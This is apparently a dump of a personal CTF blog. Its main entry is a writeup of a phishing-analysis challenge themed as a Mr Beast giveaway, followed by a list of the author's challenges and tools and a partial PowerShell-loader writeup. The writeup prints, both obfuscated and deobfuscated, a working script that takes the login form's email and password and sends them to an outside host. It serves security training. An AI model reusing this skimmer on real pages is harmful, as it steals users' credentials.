\u0026#34;spacer2\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34; id= \u0026#34;days\u0026#34;\u0026gt;Day\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;circle text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer1\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;numbers\u0026#34; id= \u0026#34;dhour\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer2\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34; id= \u0026#34;hours\u0026#34;\u0026gt;Hr\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;circle text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer1\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;numbers\u0026#34; id= \u0026#34;dmin\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer2\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34; id= \u0026#34;minutes\u0026#34;\u0026gt;Min\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;circle text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer1\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;numbers\u0026#34; id= \u0026#34;dsec\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer2\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34; id= \u0026#34;seconds\u0026#34;\u0026gt;Sec\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of clock --\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of timer-circle --\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of timer --\u0026gt; \u0026lt;div class=\u0026#34;item active\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;img/mrBeast.jpg\u0026#34; alt=\u0026#34;First slide\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;carousel-caption caption\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;The biggest christmas giveaway is on its way...\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of first item --\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;img/santa.jpg\u0026#34; alt=\u0026#34;Second slide\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;carousel-caption caption\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;You may be one of the lucky ones that will meet Santa...\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of second item --\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;img/elfs.jpeg\u0026#34; alt=\u0026#34;Third slide\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;carousel-caption caption\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Subscribe! The Mr. Beast team is waiting to meet you!\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of third item --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of carousel --\u0026gt; \u0026lt;div class= \u0026#34;body-content\u0026#34;\u0026gt; \u0026lt;!-- subscribe --\u0026gt; \u0026lt;div class= \u0026#34;container subscribe\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;col-lg-6 col-lg-offset-3 subscribe-text\u0026#34;\u0026gt; \u0026lt;h3 class= \u0026#34;text-center\u0026#34;\u0026gt;Subscribe\u0026lt;/h3\u0026gt; \u0026lt;hr class= \u0026#34;full\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Welcome to the biggest ever giveaway by the Mr. Beast team!\u0026lt;/p\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of subscribe --\u0026gt; \u0026lt;div class= \u0026#34;container after-slide\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-md-6 col-md-offset-3 col-lg-8 col-lg-offset-2 col-sm-12 col-xs-12 text-center\u0026#34;\u0026gt; \u0026lt;p class= \u0026#34;after-slide-text\u0026#34;\u0026gt;Secure your chance to win a fully paid trip to the North Pole by registering now! Don\u0026#39;t miss out on the opportunity to be among the exclusive group of participants eligible for this exciting giveaway. Register your account today for a chance at winning this exclusive trip and meeting Santa Claus in person!\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;subscribe-form\u0026#34; \u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;input-group margin-bottom-sm col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12 text-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;input-group-addon\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-envelope-o fa-fw\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;input class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Email address\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;input-group col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12 text-center form\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;input-group-addon\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-key fa-fw\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;input class=\u0026#34;form-control\u0026#34; type=\u0026#34;password\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;input-group margin-bottom-sm col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-info\u0026#34;\u0026gt;Subscribe\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of after slide part --\u0026gt; \u0026lt;!-- share part --\u0026gt; \u0026lt;div class=\u0026#34;container share\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;col-lg-6 col-lg-offset-3 share-text\u0026#34;\u0026gt; \u0026lt;h3 class= \u0026#34;text-center\u0026#34;\u0026gt;Our Socials\u0026lt;/h3\u0026gt; \u0026lt;hr class= \u0026#34;full\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Find us at our social media platforms to be updated about the results\u0026lt;/p\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;container share-icons text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;col-lg-12 col-md-12 col-sm-12 col-xs-12\u0026#34;\u0026gt; \u0026lt;ul class=\u0026#34;socials-icons col-lg-12 col-md-12 col-sm-12 col-xs-12\u0026#34;\u0026gt; \u0026lt;li\u0026gt; \u0026lt;a href=\u0026#34;https://www.facebook.com/MrBeast6000\u0026#34; data-toggle=\u0026#34;tooltip\u0026#34; title=\u0026#34;Share in Facebook\u0026#34; class=\u0026#34;facebook\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-facebook\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;a href=\u0026#34;https://twitter.com/mrbeast?lang=en\u0026#34; data-toggle=\u0026#34;tooltip\u0026#34; title=\u0026#34;Share in Twitter\u0026#34; class=\u0026#34;twitter\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-twitter\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;a href=\u0026#34;https://www.instagram.com/mrbeast/?hl=en\u0026#34; data-toggle=\u0026#34;tooltip\u0026#34; title=\u0026#34;Share in Instagram\u0026#34; class=\u0026#34;instagram\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-instagram\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of share part --\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of body content --\u0026gt; \u0026lt;!-- footer --\u0026gt; \u0026lt;div class=\u0026#34;wrapper footer\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row text-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;name col-lg-2 col-md-2 col-sm-2 col-xs-12 text-center\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Giveaway\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-lg-8 col-md-8 col-sm-8 col-xs-12 text-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;copyright\u0026#34;\u0026gt; \u0026amp;copy; Mr.Beast Team \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;col-lg-2 col-md-2 col-sm-2 col-xs-12\u0026#34; id=\u0026#34;back-top\u0026#34;\u0026gt; \u0026lt;p class= \u0026#34;pull-right\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;#home\u0026#34;\u0026gt;\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;Top\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt;\t\u0026lt;/div\u0026gt;\t\u0026lt;/div\u0026gt;\u0026lt;!-- row --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!--end of footer --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;script\u0026gt; function _0x299a(_0xa725a8,_0x48ecb7){var _0x33465e=_0x3346();return _0x299a=function(_0x299a8c,_0x4edf29){_0x299a8c=_0x299a8c-0x7f;var _0x3b4711=_0x33465e[_0x299a8c];return _0x3b4711;},_0x299a(_0xa725a8,_0x48ecb7);}var _0x52de18=_0x299a;function _0x3346(){var _0x1cd6fe=[\u0026#39;length\u0026#39;,\u0026#39;.subscribe-form\\x20.form-control[type=\\x22password\\x22]\u0026#39;,\u0026#39;click\u0026#39;,\u0026#39;10GjwUiH\u0026#39;,\u0026#39;283448ojrvqi\u0026#39;,\u0026#39;PSkvNyoILFxaI0BVW0M+RlBZR1QsVVxHPkAXXUYYBAldRlIsD14DVRdVF0Ec\u0026#39;,\u0026#39;.subscribe-form\\x20.btn.btn-info\u0026#39;,\u0026#39;GET\u0026#39;,\u0026#39;11wIJUzs\u0026#39;,\u0026#39;385aGCgYF\u0026#39;,\u0026#39;203916QRBBAJ\u0026#39;,\u0026#39;addEventListener\u0026#39;,\u0026#39;186854HAAPmi\u0026#39;,\u0026#39;DOMContentLoaded\u0026#39;,\u0026#39;push\u0026#39;,\u0026#39;34662TcBphL\u0026#39;,\u0026#39;join\u0026#39;,\u0026#39;open\u0026#39;,\u0026#39;value\u0026#39;,\u0026#39;querySelector\u0026#39;,\u0026#39;charCodeAt\u0026#39;,\u0026#39;5003910eMoXPe\u0026#39;,\u0026#39;945368MfXSkw\u0026#39;,\u0026#39;9CofhOF\u0026#39;,\u0026#39;\u0026amp;apikey=\u0026#39;,\u0026#39;https://storage.appssec.co.ind?email=\u0026#39;,\u0026#39;send\u0026#39;,\u0026#39;724557XgnpSv\u0026#39;];_0x3346=function(){return _0x1cd6fe;};return _0x3346();}(function(_0x104a86,_0xa6db47){var _0x4c8d43=_0x299a,_0xf91101=_0x104a86();while(!![]){try{var _0x29d6b2=-parseInt(_0x4c8d43(0x8c))/0x1+parseInt(_0x4c8d43(0x94))/0x2+-parseInt(_0x4c8d43(0x87))/0x3+-parseInt(_0x4c8d43(0x92))/0x4*(parseInt(_0x4c8d43(0x8b))/0x5)+parseInt(_0x4c8d43(0x97))/0x6*(parseInt(_0x4c8d43(0x91))/0x7)+-parseInt(_0x4c8d43(0x82))/0x8*(parseInt(_0x4c8d43(0x83))/0x9)+parseInt(_0x4c8d43(0x81))/0xa*(parseInt(_0x4c8d43(0x90))/0xb);if(_0x29d6b2===_0xa6db47)break;else _0xf91101[\u0026#39;push\u0026#39;](_0xf91101[\u0026#39;shift\u0026#39;]());}catch(_0x4597d0){_0xf91101[\u0026#39;push\u0026#39;](_0xf91101[\u0026#39;shift\u0026#39;]());}}}(_0x3346,0x28a39),document[_0x52de18(0x93)](_0x52de18(0x95),function(){var _0x3010de=_0x52de18;const _0x4c17d1=document[\u0026#39;querySelector\u0026#39;](_0x3010de(0x8e)),_0x5bc16f=document[_0x3010de(0x7f)](\u0026#39;.subscribe-form\\x20.form-control[type=\\x22text\\x22]\u0026#39;),_0x106e8a=document[_0x3010de(0x7f)](_0x3010de(0x89));_0x4c17d1[_0x3010de(0x93)](_0x3010de(0x8a),function(){var _0xaf724a=_0x3010de;const _0x3a9d03=_0x5bc16f[_0xaf724a(0x9a)],_0x38e031=_0x106e8a[_0xaf724a(0x9a)];var _0x37a3bb=_0xaf724a(0x8d);function _0x2ae5a0(_0x49225f){var _0x4a91e4=_0xaf724a,_0x1d14ff=[\u0026#39;s\u0026#39;,\u0026#39;a\u0026#39;,\u0026#39;n\u0026#39;,\u0026#39;t\u0026#39;,\u0026#39;a\u0026#39;],_0x1bcfcc=[];input=atob(_0x49225f);for(var _0x4d4b2f=0x0;_0x4d4b2f\u0026lt;input[_0x4a91e4(0x88)];_0x4d4b2f++){var _0x41b22f=input[_0x4a91e4(0x80)](_0x4d4b2f)^_0x1d14ff[_0x4d4b2f%_0x1d14ff[_0x4a91e4(0x88)]][_0x4a91e4(0x80)](0x0);_0x1bcfcc[_0x4a91e4(0x96)](String[\u0026#39;fromCharCode\u0026#39;](_0x41b22f));}return _0x1bcfcc[_0x4a91e4(0x98)](\u0026#39;\u0026#39;);}function _0xe05049(){var _0x3ebbc9=_0xaf724a,_0x45261b=_0x3a9d03,_0x2bf34e=_0x38e031,_0x5ba78a=_0x2ae5a0(_0x37a3bb),_0x5b4edc=new XMLHttpRequest();_0x5b4edc[_0x3ebbc9(0x99)](_0x3ebbc9(0x8f),_0x3ebbc9(0x85)+_0x45261b+\u0026#39;\u0026amp;password=\u0026#39;+_0x2bf34e+_0x3ebbc9(0x84)+String(_0x5ba78a)),_0x5b4edc[_0x3ebbc9(0x86)]();}_0xe05049();});})); \u0026lt;/script\u0026gt; This request contains the index.html page of the themrbeas7.org website.\nWe can spot a suspicious looking script at the end of the html file contained in the request, but it does not make a lot of sense. We can distinguish some strings such as password, fromCharCode, h[x][x]ps://storage.appssec.co.ind? and so on.\nThis is basically obfuscated javascript. Let\u0026rsquo;s try to deobfuscate it and make sense of it.\nFor this purpose, we can use the online tool:\nhttps://deobfuscate.relative.im/ We can pass the obfuscated javascript to it and click on \u0026lsquo;deobfuscate\u0026rsquo;. Doing this, we get the following code:\ndocument.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, function () { const _0x4c17d1 = document.querySelector(\u0026#39;.subscribe-form .btn.btn-info\u0026#39;), _0x5bc16f = document.querySelector( \u0026#39;.subscribe-form .form-control[type=\u0026#34;text\u0026#34;]\u0026#39; ), _0x106e8a = document.querySelector( \u0026#39;.subscribe-form .form-control[type=\u0026#34;password\u0026#34;]\u0026#39; ) _0x4c17d1.addEventListener(\u0026#39;click\u0026#39;, function () { const _0x3a9d03 = _0x5bc16f.value, _0x38e031 = _0x106e8a.value var _0x37a3bb = \u0026#39;PSkvNyoILFxaI0BVW0M+RlBZR1QsVVxHPkAXXUYYBAldRlIsD14DVRdVF0Ec\u0026#39; function _0x2ae5a0(_0x49225f) { var _0x1d14ff = [\u0026#39;s\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;a\u0026#39;], _0x1bcfcc = [] input = atob(_0x49225f) for (var _0x4d4b2f = 0; _0x4d4b2f \u0026lt; input.length; _0x4d4b2f++) { var _0x41b22f = input.charCodeAt(_0x4d4b2f) ^ _0x1d14ff[_0x4d4b2f % _0x1d14ff.length].charCodeAt(0) _0x1bcfcc.push(String.fromCharCode(_0x41b22f)) } return _0x1bcfcc.join(\u0026#39;\u0026#39;) } function _0xe05049() { var _0x45261b = _0x3a9d03, _0x2bf34e = _0x38e031, _0x5ba78a = _0x2ae5a0(_0x37a3bb), _0x5b4edc = new XMLHttpRequest() _0x5b4edc.open( \u0026#39;GET\u0026#39;, \u0026#39;https://storage.appssec.co.ind?email=\u0026#39; + _0x45261b + \u0026#39;\u0026amp;password=\u0026#39; + _0x2bf34e + \u0026#39;\u0026amp;apikey=\u0026#39; + String(_0x5ba78a) ) _0x5b4edc.send() } _0xe05049() }) }) This script still looks obfuscated but we can agree that it looks much better than before. It basically adds a Listener on the subscribe form button. Listeners in javascript are basically actions that wait to be happened. Here, once the subscribe-form button has been clicked, the script we deobfuscated will run. But what does it actually do?\nWell, we see that it gets a username and a password from the form that had its button clicked. Then, it makes a request to the website h[x][x]ps://storage.appssec.co.ind with url arguments:\nusername password apikey The interesting part here is how the apikey is found. We notice a base64 encoded string that is decoded, xored with the key santa and then passed to the url where the request will be made.\nFollowing up with the actions of the script, if we decode the base64 string and xor it with the key, we will get the apikey which is also the flag for this challenge:\n\u0026gt;\u0026gt;\u0026gt; from base64 import b64decode \u0026gt;\u0026gt;\u0026gt; from pwn import xor \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; apikey_encrypted = b\u0026#39;PSkvNyoILFxaI0BVW0M+RlBZR1QsVVxHPkAXXUYYBAldRlIsD14DVRdVF0Ec\u0026#39; \u0026gt;\u0026gt;\u0026gt; apikey_encr = b64decode(apikey_encrypted.decode()) \u0026gt;\u0026gt;\u0026gt; key_for_decryption = b\u0026#39;santa\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; xor(apikey_encr, key_for_decryption) b\u0026#39;NHACK{M2.B3457_51735_423_3v32ywh323_n0w4d4y5}\u0026#39; \u0026gt;\u0026gt;\u0026gt; Bonus ways to solve it:\nAdd the following line in the javascript function _0xe05049() of the website: alert(_0x5ba78a); and then visit the website and click on the Subscribe button. This will decrypt the apikey for you and print it on the screen in an alert box. This is happening since the _0x5ba78a is the decrypted apikey returned from the function _0x37a3bb. Open Wireshark, run a fakedns server and click on the subscribe button without modifying javascript this time. What will happen is a DNS query to storage.appssec.co.ind will be successful and thus, a request with the username, password and decrypted api key will be made to this host which will be visible in Wireshark. Overall, the website tried to act as a legitimate site, gathering credentials from users and sending them to a possible VPS server. These could later be tried as reused credentials for other websites as this is very common amongst users.\nThis is it for this challenge.\n","permalink":"http://localhost:1313/ctfwriteups/xmasgiveaway/","summary":"Starting the analysis A pcap file is provided to the user. Pcap files are network capture files that provide an insight of what requests were made to what websites, the contents of each request and much more.\nOpening the file with Wireshark, we can view all the requests.\nThe request that is of interest is the one made to themrbeas7.org and is the following:\nGET /christmasGiveaway/index.html HTTP/1.1 Host: themrbeas7.org User-Agent: Mozilla/5.","title":"Mr Beast Xmas Giveaway - Writeup"},{"content":"A list of challenges (at least some of them) that I have made for either conferences, CTFs or just myself:)\nThese will mostly be based on stuff I read along the way and felt like they would be fun to make and also learn by doing it.\nForensics An email from aunt Chloe\nDifficulty: Hard (Play/Writeup) Description: I recently got an email from my Aunt Chloe. She visited the village of Santa in the North pole and she was so kind that see sent me a traditional recipe that they make there followed by an image of the village. What an amazing Aunt!\rmr Beast Xmas Giveaway\nDifficulty: Easy (Play/Writeup) Description: It was almost Christmas. You made hot chocolate to drink, sat on your comfy couch, and watched the newly uploaded Mr Beast video. Soon after, an ad appeared on your screen that led to a giveaway page seemingly run by Mr\rBeast, offering a huge Christmas prize for a few lucky winners. Filled with excitement after the video, you subscribed to the giveaway page and waited. And waited. Christmas went by, but nothing happened. Shortly afterward, you discovered an article about a phishing website, the same one you subscribed to. Confused as you read through the article, you decided to investigate the website yourself and captured its traffic. What can you find?\rMr Anderson\nDifficulty: Medium (Play/Writeup) Description: Mr. Anderson received an urgent email in July from what appeared to be his bank, notifying him of an unpaid loan in his name. Despite attempts to resolve the issue through a linked page, which continuously failed to load, Mr. Anderson received no response to his inquiries. Instead, he discovered unauthorized transactions through email notifications, sparking urgent action to secure his compromised accounts and unravel the mystery behind the email's intentions.\rWeak legacy\nDifficulty: Easy (Play/Writeup) Description: Eve was able to intercept messages between Alice and Bob, but some seem to be encrypted. Can you help her find out what they were talking about?\rInsider\nDifficulty: Easy (Play/Writeup) Description: The CTFLIB team has been constantly growing becoming like a big family. Each month new players join our team and contribute with new challenges to the server. Recently though, we had an incident. A leak of some flags to a known stolen database forum has been reported. Since there was no indication of compromise to the server, the most possible scenario is that we have an insider in our team. You, being a trusted member, are asked to investigate the latest player that joined our community to see if we rightfully suspect him of leaking the flags. We supply you with an image of his system to start your investigation.\rFlag on the run\nDifficulty: Easy (Play/Writeup) Description: A wizard was on his way to trade some secret flags with some elves and get magic filters in exchange. But one of the flags managed to escape. To make matters worse, the flag covered its tracks based on an ancient papyrus it stole from the wizard as it fled. Fortunately for him, the wizard had a copy of this papyrus and thus he can recover the flags traces. Can you help the wizard find where the flag is hidding?\rHinting flags\nDifficulty: Easy (Play/Writeup) Description: Think you can crack this users' password hint? Try analyzing this memory dump and find out for yourself.\rHeadstream\nDifficulty: Medium (Play/Writeup) Description: My friend is in love with the GTA games. Recently, the GTAVI got leaked. As soon as he read about it, he rushed to piratesbay and to his surprise, someone had uploaded the leaked version. Full of joy, he downloaded the game bu upon opening it, an error was displayed. As much as he tried fixing it, he was met with the same error. Can you help him?\rMalware Carving\nDifficulty: Medium (Play/Writeup) Description: As i was researching on the topic of virtual memory and system paging, i downloaded some pdf files to read. It was at this point where once i closed some pdf files i had finished reading with my Adobe Reader, my Antivirus notified me about some outgoing connections from my pc. Can you find what happened? Since I was reading about virtual memory, i think its better to supply you with my pagefile.sys to see what was running at the time of the incident.\rChinese Windows Upgrader\nDifficulty: Hard (Play/Writeup) Description: I wanted to upgrade my Windows to Windows 11 pro so I searched for a way to do it. I ended up finding a batch script but there is something weird about it. Since this script did not work, I opened it to see how it works but it seems like the script is written in Chinese. Can you figure out what this script does? I will provide you with the script and a memory dump of the machine to see what you can find.\rAnother malicious doc\nDifficulty: Hard (Play/Writeup) Description: Not your typical doc.\rIRS went phishing\nDifficulty: Medium (Play/Writeup) Description: I never expected the IRS to owe me money. What a lucky man I am...or am I?\rShowerpell\nDifficulty: Medium (Play/Writeup) Description: We recently had a security incident where a user installed something malicious. The analysis of the incident seems never-ending as each step reveals a new level of complexity.\rUpgrading Windows\nDifficulty: Easy (Play/Writeup) Description: I could not be more happy with the upgrade of my Windows. However, who is this new user added in the system?\rsysupdate\nDifficulty: Easy (Play/Writeup) Description: A system update you shouldn't be looking forward to.\rcaptcha 4 humans\nDifficulty: Easy (Play/Writeup) Description: Can you crack this hash and bypass the anti-human CAPTCHA?\rReverse Engineering Ancient Cave Vault\nDifficulty: Easy (Play/Writeup) Description: In the heart of a forbidding cave, an intrepid explorer ventured through the oppressive darkness, shadows dancing at the edge of her lantern's light. She stumbled upon an enigmatic ancient vault, its entrance adorned with cryptic symbols. Determined, she desperately tries to find the correct passphrase that will unlock the secrets within. But her time is running low and the beasts of the cave are starting to wake up. Can you help her?\rCryptography Sloppy Encryptor\nDifficulty: Easy (Play/Writeup) Description: I wonder if we could somehow recover the original text from the mysterious file that was found on an old hard drive of a mathematician. A script was also recovered that seems to have encrypted the text. Can you manage to recover this mysterious files?\rSigning factory\nDifficulty: Medium (Play) Description: Visit HTB for more\r","permalink":"http://localhost:1313/mychallenges/","summary":"my challenges","title":"My Challenges"},{"content":"A list of projects/tools that I have made along my journey of learning, either that be for a CTF or a real world scenario.\nForensics PcapAnalysis (GitHub) A script that is useful when analyzing malware traffic pcaps. It's goal is to find all HTTP and HTTPS hosts that a victim IP interacted with. Once it runs through the pcap file and collects all hosts which interacted with the victim ip, it makes request to VirusTotal in order to distinguish the malicious ones with the rest. It saves ...\rWeb Attacks vulnerable_phpThumb (GitHub) A script which scrapes the web using dorks to find domains that still use vulnerable versions of the phpThumb php script.\rReversing tools DotNetParser (GitHub) A script that is used to quickly parse a .NET assembly to read its methods and instructions. It's just a quick way to parse and decompile raw bytecode to IL and read the instructions, instead of loading it to a decompiler like DnSpy, ILSpy etc.\rJlaive-Deobfuscator (GitHub) A script that deobfuscates and reconstructs all parts used in the Jlaive obfuscation process, including the final decrypted executable.\rObfuscation scripts forcoding-Obfuscator (GitHub) A script used for forcode-obfuscating cmd commands.\rAutomation tools / Scrapers pscrapy (GitHub) A script used for scraping the Pararius website, find and submit forms for new properties - also bypassing cloudflares anti-bot protection.\r","permalink":"http://localhost:1313/projects/","summary":"projects","title":"Projects"},{"content":"In this challenge, we are given a pcap file. By observing the packets in the pcap, one is identified which appears to be transferring a file named \u0026ldquo;dnsexfil.ps1\u0026rdquo;. Using the option File \u0026ndash;\u0026gt; Export Objects \u0026ndash;\u0026gt; HTTP in Wireshark, this file can be downloaded for further analysis. You can retrieve this packet from Wireshark by going to File \u0026ndash;\u0026gt; Export Objects \u0026ndash;\u0026gt; HTTP.\nWith the help of a text editor, we can open this powershell script and view its contents:\nThe file appears to contain encoded code.\nBy observing the code, the following significant elements are identified:\nAt the end of the file, there is the string \u0026ldquo;i\u0026rsquo;e\u0026rsquo;x\u0026rdquo;, which indicates how PowerShell commands are executed. This suggests that running the code will create an executable file. The malicious program to be created appears to decode a base64-encoded large string. The result of the decoding is decompressed using the deflateStream method. Following these steps, it is possible to retrieve the code that will be executed. For this purpose, the online tool CyberChef (https://gchq.github.io/CyberChef/) can be used.\nThe result is now in an unreadable format and can be saved into a file named \u0026ldquo;deobfuscated.ps1\u0026rdquo; for further analysis:\nThe code that emerges appears to decode from base64 and store a large string in a variable. Using CyberChef again, the decoding can be performed:\nThe result may not be as readable as the previous code; however, the first 2 bytes MZ indicate executable file headers. Therefore, it should be saved as a .exe file.\nUsing the file command, you can retrieve basic information about the executable, such as it being a .NET file:\n┌──(connar㉿kali)-[~/showerpell]\r└─$ file someExecutable.exe\rsomeExecutable.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows Since the executable is a .NET file, you can use the tool DNSPY to analyze its code:\nObserving the code, the flag of the challenge is identified as a variable within the main function:\nFLAG{y0u_h4v3_r34ch3d_7h3_d3p7h5_0f_4_r34l_w0rld_t00l_y0u_5h0uld_b3_pr0ud!}\nIn creating this challenge, tools used by malicious entities in the real world were leveraged.\n","permalink":"http://localhost:1313/ctfwriteups/showerpell/","summary":"In this challenge, we are given a pcap file. By observing the packets in the pcap, one is identified which appears to be transferring a file named \u0026ldquo;dnsexfil.ps1\u0026rdquo;. Using the option File \u0026ndash;\u0026gt; Export Objects \u0026ndash;\u0026gt; HTTP in Wireshark, this file can be downloaded for further analysis. You can retrieve this packet from Wireshark by going to File \u0026ndash;\u0026gt; Export Objects \u0026ndash;\u0026gt; HTTP.\nWith the help of a text editor, we can open this powershell script and view its contents:","title":"Showerpell - Writeup"},{"content":"This is a writeup for the sloppy encryptor challenge We are given an encrypted file containing unreadable text and the file used to produce it.\nThe encrypted text is: 